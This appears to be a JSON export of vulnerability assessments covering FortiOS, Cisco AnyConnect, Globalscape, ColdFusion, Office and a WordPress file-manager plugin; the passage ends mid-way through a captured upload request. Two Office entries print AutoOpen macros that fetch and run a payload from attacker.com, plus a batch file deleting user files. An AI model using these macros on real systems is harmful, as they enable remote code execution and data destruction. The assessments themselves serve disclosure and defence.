          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6dcfc74f-3ac2-47c1-947a-674de59f9a13",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "72b459e2-5782-469e-86bc-5ea7b0a51b61",
      "created": "2023-06-20T09:16:31.783902Z",
      "revisionDate": "2023-06-20T09:16:31.783129Z",
      "document": "Fortinet has issued an advisory regarding a critical vulnerability in FortiOS, known as CVE-2023-25610. This vulnerability poses a significant risk of remote code execution (RCE) and affects Fortinet's operating system. Specifically, the vulnerability resides in the administrative interface and involves a buffer underwrite bug. Exploiting this flaw, an unauthorized remote attacker can execute code by utilizing specially crafted requests.\r\n\r\nTo mitigate this vulnerability, it is crucial for affected customers to promptly apply the available patch to their FortiOS instances. Upgrading to the patched versions is highly recommended to ensure system security.\r\n\r\nCVE-2023-25610 is a buffer underwrite (or \"buffer underflow\") exploit that impacts the administrative interface of FortiOS and FortiProxy. It arises when a program writes data to a buffer with a size smaller than the data itself, resulting in the overwrite of adjacent memory locations.\r\n\r\nExploiting this vulnerability could empower an unauthenticated attacker to remotely execute arbitrary code on the device or launch a denial-of-service (DoS) attack on the graphical user interface (GUI). To carry out such an attack, the malicious actor would need to send specifically crafted requests to the target device.\r\n\r\nIt is worth noting that a proof of concept for this vulnerability was published on March 11, which increases the likelihood of it being exploited in real-world scenarios.\r\n\r\nWiz Research data reveals that approximately 9% of cloud enterprise environments remain vulnerable to this particular flaw. Moreover, among environments utilizing FortiOS, a staggering 80% have yet to apply the necessary patch to safeguard against it.\r\n\r\nThis marks the another critical vulnerability discovered in FortiOS this year, with the previous instance, CVE-2022-42475, being rapidly exploited in the wild shortly after its disclosure. Therefore, it is anticipated that this latest vulnerability will likely face similar exploitation. Especially with a a few public exploit example being available. \r\n\r\nThe following product versions are affected by CVE-2023-25610:\r\n\r\n- FortiOS versions 7.2.0 through 7.2.3\r\n- FortiOS versions 7.0.0 through 7.0.9\r\n- FortiOS versions 6.4.0 through 6.4.11\r\n- FortiOS versions 6.2.0 through 6.2.12\r\n- All versions of FortiOS 6.0\r\n- FortiProxy versions 7.2.0 through 7.2.2\r\n- FortiProxy versions 7.0.0 through 7.0.8\r\n- FortiProxy versions 2.0.0 through 2.0.11\r\n- All versions of FortiProxy 1.2\r\n- All versions of FortiProxy 1.1\r\n\r\nFortinet has also acknowledged the potential vulnerability impact on other products. However, in those cases, an attacker would only be able to initiate a denial-of-service (DoS) attack rather than achieve remote code execution (RCE).",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9d5631c7-5496-4df1-8865-55541ce43906",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "144bfb67-0873-432e-8f48-a94ee58d6286",
      "created": "2023-06-20T09:32:05.041681Z",
      "revisionDate": "2023-06-20T09:32:46.911981Z",
      "document": "It's hard to find a SH4 architecture gcc compilation toolchain outside of debian / ubuntu. Cross compilation make it uneasy to compile the payload.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b63c65fa-37c3-46b9-921d-eda7524d9515",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "8de65594-9f16-44d1-a8ef-c838d25fce76",
      "created": "2023-06-20T09:36:15.905298Z",
      "revisionDate": "2023-06-20T09:36:15.904668Z",
      "document": "It should be easy to exploit but there is no known public exploit.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "69dee0c1-915f-43f0-8c94-d9ac9296aa9f",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "e3a7e71f-132d-4d85-8b51-ce22e2cabff2",
      "created": "2023-06-20T09:37:24.736835Z",
      "revisionDate": "2023-06-20T09:37:24.736013Z",
      "document": "No known public exploit.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "940c75aa-e8fb-4239-92f6-35768c65459f",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "d539b24d-8c01-4f28-9596-eecddf37eb03",
      "created": "2023-06-20T09:40:49.262479Z",
      "revisionDate": "2023-06-20T09:40:49.26181Z",
      "document": "No known public exploit.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8bdd77a0-bd04-4f2c-9407-d86a0fc673a3",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "3f7eb772-577a-4ee4-bcbb-6da9f0ec50f6",
      "created": "2023-06-20T09:56:13.858177Z",
      "revisionDate": "2023-06-20T09:56:13.857495Z",
      "document": "The version of Dell EMC iDRAC8 or Dell EMC iDRAC9 prior to 2.83.83.83/5.10.30.00 are vulnerable to this. [Dell advisory](https://www.dell.com/support/kbdoc/fr-fr/000200644/dsa-2022-154-dell-idrac8-and-dell-idrac9-security-update-for-an-openssl-vulnerability).",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ad340d8f-1a8d-4fab-8a17-bfc355dbf7cf",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "88cd76f3-70ac-406e-8d97-a2314a81d1f1",
      "created": "2023-06-21T07:25:42.621125Z",
      "revisionDate": "2023-06-21T20:02:28.440833Z",
      "document": "A security flaw has been discovered in the client update procedure of both Cisco AnyConnect Secure Mobility Client Software for Windows and Cisco Secure Client Software for Windows. This vulnerability could potentially enable a local attacker with low privileges and authenticated access to elevate their privileges to the level of SYSTEM. The client update process is triggered upon the establishment of a successful VPN connection.\r\n\r\nWhen a user connects to the VPN, a background process called vpndownloader.exe is initiated. This process creates a directory in the c:\\windows\\temp location with default permissions, following the format <random numbers>.tmp. Subsequently, vpndownloader.exe checks if the directory is empty, and if not, it proceeds to delete all files and directories within it. This particular behavior can be exploited to carry out arbitrary file deletions under the NT Authority\\SYSTEM account.\r\n\r\nThe vulnerability stems from the improper assignment of permissions to a temporary directory generated during the update process. An attacker can take advantage of a specific function within the Windows installer process to exploit this vulnerability. If successfully exploited, the attacker could execute code with SYSTEM privileges.\r\n\r\nTo mitigate this vulnerability, Cisco has released software updates that specifically address the issue. Unfortunately, there are no workarounds available to rectify the vulnerability apart from applying the provided software updates.\r\n\r\nA Proof of Concept (PoC) has been released and can be found in the reference links.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "3bf171ec-0b6e-45e1-b816-77a22b769218",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "130547f8-855f-4a9e-9e52-eba7c65ea1cc",
      "created": "2023-06-22T17:42:48.678952Z",
      "revisionDate": "2023-06-22T17:45:41.566913Z",
      "document": "At its core, this is a blind out of bounds memory read in the packet parser for the Fortra Globalscape admin server. That means that you can trick the packet parser into leaving the memory bounds of its packet and processing other memory as if it was part of the packet. The most likely result is sending the parser into unallocated memory and crashing the process.\r\n\r\nHowever, if an attacker can correctly guess the offset of another user's login packet (which isn't as crazy as it sounds - packets are typically close together on the heap), they can use the other user's login and bypass authentication altogether.\r\n\r\nWithout some sorta heap massaging or very lucky guessing, this is going to be very difficult to exploit, but it's definitely interesting!\r\n\r\n[Simple PoC](https://github.com/rbowes-r7/gestalt/tree/main/oob-memory-read)",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "fb0caf23-0673-475c-b7ff-4bcf3079aba2",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "1253d80f-bca8-4a0f-acd6-0270225aab56",
      "created": "2023-06-22T17:46:55.642599Z",
      "revisionDate": "2023-06-22T17:46:55.642188Z",
      "document": "This is effectively a zipbomb - the inbound message parser for the Fortra Globalscape's admin protocol accepts compressed messages, but the decompression code is recursive. That means that, if you send a message that decompresses into itself with a short header (effectively a \"quine\"), it will recurse infinitely and eventually blow the stack.\r\n\r\nWhile it doesn't give any useful access, it's a neat vuln with a (mathematically) neat exploit!\r\n\r\n[PoC](https://github.com/rbowes-r7/gestalt/tree/main/quine-zip-dos)",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "4cd16491-9e75-4290-a171-273aa912f672",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "1d53f235-c8bf-4210-83e8-28d9f7a16d54",
      "created": "2023-06-22T17:49:57.410834Z",
      "revisionDate": "2023-06-22T17:49:57.410672Z",
      "document": "A special request to the Fortra Globalscape admin service returns what they call a TER - Trial Extension Request - which is a lightly-obfuscated Base64 string that contains the SHA256 sum of the harddrive's serial number. The search space is small enough that it's possible to reasonably bruteforce the hash, even on laptop hardware",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "e7c5b61b-82a8-455a-b288-c5ecc96f4a74",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "fb9be99d-7dde-493d-8c9d-12f3dd901458",
      "created": "2023-06-22T19:05:45.011096Z",
      "revisionDate": "2023-06-22T19:05:45.011895Z",
      "document": "Based on writing an [exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/adobe_coldfusion_rce_cve_2023_26360.rb) and the [AttackerKB Analysis](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360#rapid7-analysis), I can confirm the exploitability of this vulnerability is easy and in a default configuration of the target software.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d3d1655f-d8ca-48fd-809c-5e1476637ad1",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "5db640dc-b30f-464a-bc81-ed3c15946d65",
      "created": "2023-06-22T19:13:10.779068Z",
      "revisionDate": "2023-06-22T19:13:10.779713Z",
      "document": "After investigating a separate ColdFusion vulnerability [CVE-2023-26360](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis) and in conjunction with privately reported information regarding CVE-2023-26359, I can rate this vulnerability as easily exploited and vulnerable in a default configuration.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2e6d0d48-5318-4941-8824-d530689dc6f9",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "fd7b8d51-28ac-439c-a761-a2f76eacf75b",
      "created": "2023-06-23T18:30:53.998054Z",
      "revisionDate": "2023-06-26T11:00:33.213582Z",
      "document": "## [CVE-2023-33140](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-33140)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-33140/docs/Screenshot%202023-06-22%20122526.png)\r\n\r\n## Description:\r\nMicrosoft OneNote is vulnerable to spoofing attacks. The malicious user can trick the victim into clicking on a very maliciously crafted URL or download some other malicious file and execute it. When this happens the game will be over for the victim and his computer will be compromised.\r\nExploiting the vulnerability requires that a user open a specially crafted file with an affected version of Microsoft OneNote and then click on a specially crafted URL to be compromised by the attacker.\r\n\r\nSTATUS: 6.5 MEDIUM Vulnerability\r\n\r\n[+]Exploit:\r\n```vbs\r\nSub AutoOpen()\r\n  Call Shell(\"cmd.exe /S /c\" & \"curl -s https://attacker.com/kurec.badass > kurec.badass && .\\kurec.badass\", vbNormalFocus)\r\nEnd Sub\r\n\r\n```\r\n[+]Inside-exploit\r\n```\r\n@echo off\r\ndel /s /q C:%HOMEPATH%\\IMPORTANT\\*\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2023/CVE-2023-33140)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2023/06/cve-2023-33140.html)\r\n\r\n## Time spend:\r\n01:15:00",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "a7e5f93e-185f-4ac8-89b8-6ff26aad4250",
      "editorId": "f79500fd-d3b6-4261-8949-d0d43b71faff",
      "topicId": "251ef933-fd0f-4e12-8987-1d9c2172c6df",
      "created": "2023-06-27T08:26:40.043438Z",
      "revisionDate": "2023-06-27T08:26:40.044257Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "32fefd6d-7f62-476f-8e1c-caec5badcc0a",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "4ffab958-5a56-493c-b7ba-5562dfaae988",
      "created": "2023-06-27T09:52:59.857225Z",
      "revisionDate": "2023-06-27T09:52:59.857434Z",
      "document": "## [CVE-2023-33137](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-33137)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows11Exploits/main/2023/CVE-2023-33137/docs/Screenshot%202023-06-27%20115210.png)\r\n\r\n## [Vendor](https://www.microsoft.com/)\r\n\r\n## [Software](https://www.microsoft.com/en-us/microsoft-365/excel)\r\n\r\n## Description:\r\nThis exploit is connected with third part exploit server, which waits for the victim to call him and execute the content from him using the pipe posting method! This is absolutely a 0-day exploit! This is absolutely dangerous for the victims, who are infected by him! \r\nWhen the victim hit the button in the Excel file, it makes a POST request to the exploit server, and the server is responding back that way: He creates another hidden malicious file and executed it directly on the machine of the victim, then everything is disappeared, so nasty. \r\n\r\nSTATUS: HIGH Vulnerability WARNING: THIS IS VERY DANGER for the usual users!\r\n\r\n[+]Exploit:\r\n```vbs\r\nSub AutoOpen()\r\n  Call Shell(\"cmd.exe /S /c\" & \"curl -s https://attacker.com/nu11secur1ty/somwhere/ontheinternet/maloumnici.bat > maloumnici.bat && .\\maloumnici.bat\", vbNormalFocus)\r\nEnd Sub\r\n\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33137)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2023/06/microsoft-excel-microsoft-365-mso.html)\r\n\r\n## Time spend:\r\n01:27:00\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "865455eb-b276-4083-af20-bf1f5bca30b3",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "b6270e94-5aab-4f58-95d6-039a37b6bfbf",
      "created": "2023-06-27T14:58:20.224558Z",
      "revisionDate": "2023-06-27T20:48:58.15206Z",
      "document": "`WordPress` is one of the most used web application platforms on the Internet with million and million of installations. The platform provides a huge amount of content with so called plugins that enables certain functionality such as payment services, file managers,  web forms, security and much more.\r\nIt is on one side great to have such rich functionality available in the platform, but the downside is that these plugins can also trigger a lot of vulnerabilities.\r\nAnd  indeed, the `WordPress` platform has become infamous for the huge amount of vulnerabilities introduced at the platform over the  last couple of years.\r\n\r\nThis writeup is a perfect example where a plugin `File Manager Advanced` and  an add-on `File Manager Advanced Shortcode` introduced a vulnerability where an unauthenticated malicious actor can upload a webshell and execute payloads that provides unauthorized access to the operating system below.\r\n\r\nLet me first explain a bit what a  `shortcode` is in the `WordPress` world.\r\nA `shortcode` is a specially formatted text tag that opens and closes with square brackets and can be placed directly in a post or a page of your blog. This tag is automatically interpreted by `WordPress` and allows you to add features without having to program code. You can recognize a `shortcode` section by seeing brackets like `[this]`, that performs a dedicated function on your site. You can place it just about anywhere you\u2019d like, and it will add a specific feature to your page, post, or other content. For example, you can use shortcodes to display galleries, videos, or even playlists.\r\n\r\n`WordPress` has several plugins that delivers specific functionality that you can use and the `File Manager Advanced Shortcode` plugin is one of these features that allows you to code `File Manager Advanced ` functionality on a page or post using shortcodes.\r\n\r\nThe section below shows an example of a shortcode using the `File Manager Advanced Shortcode` plugin that allows you to upload or download files depending on the `shortcode` configuration. For instance, at the example below a login is required to upload or download files (authenticated).\r\n```\r\n[file_manager_advanced login=\"yes\" roles=\"author,editor,administrator\" path=\"wp-content\" hide=\"plugins\"\r\noperations=\"download,upload\" block_users=\"5\" view=\"grid\" theme=\"light\" lang =\"en\" upload_allow=\"image/png\" upload_max_size=\"2G\"]\r\n```\r\nand the `shortcode` will provide the file manager functionality on the page below when published.\r\n\r\n![File Manager Advanced Shortcode](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2023-2068/FMA_shortcode_plugin_linux_auth_rce.png).\r\n\r\nSo far, so good, but what is now exactly the issue with this plugin?\r\n\r\nTo understand this a bit better, let's first explore what is happening under the hood if we upload a small `png` file (ruby.png).\r\nWe will capture the `HTTP` request and response with `burpsuite`.\r\nThe actual upload happens with a `POST` request and form data that is shown below.\r\n```\r\nPOST /wordpress/wp-admin/admin-ajax.php HTTP/1.1\r\nHost: 192.168.201.10\r\nContent-Length: 2502\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nAccept: */*\r\nOrigin: http://192.168.201.10\r\nReferer: http://192.168.201.10/wordpress/index.php/fma-auth/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: wordpress_bbdf06293059980896f1ee8c0e8b218c=admin%7C1688056648%7CB7maHYtYiY720ai72sOLpfz8j0hSdisDFJqvoSYsqgK%7C690658a3c5dab7494d7840e3d4ecfdfdf17494f6ae163a3fd3ac8093e1529784; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbdf06293059980896f1ee8c0e8b218c=admin%7C1688056648%7CB7maHYtYiY720ai72sOLpfz8j0hSdisDFJqvoSYsqgK%7C5666c9036374c0c892b17a6abaf647dc5baf618ca489084627fde0df45b80d8f; wfwaf-authcookie-dd668d04efe9e4ab71eb81bd40139a86=1%7Cadministrator%7Cmanage_options%2Cunfiltered_html%2Cedit_others_posts%2Cupload_files%2Cpublish_posts%2Cedit_posts%2Cread%7C0f200eccb75504c01e48ae0344893dd5df62a8aad161c24058089881c58bfbfc; PHPSESSID=2csqd51ghug6138llcu5dtskjm\r\nConnection: close\r\n\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n188fdc67f782e3\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nfma_load_shortcode_fma_ui\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"_fmakey\"\r\n\r\nd2ef442bd5\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\nwp-content\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"w\"\r\n\r\nfalse\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"r\"\r\n\r\ntrue\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; 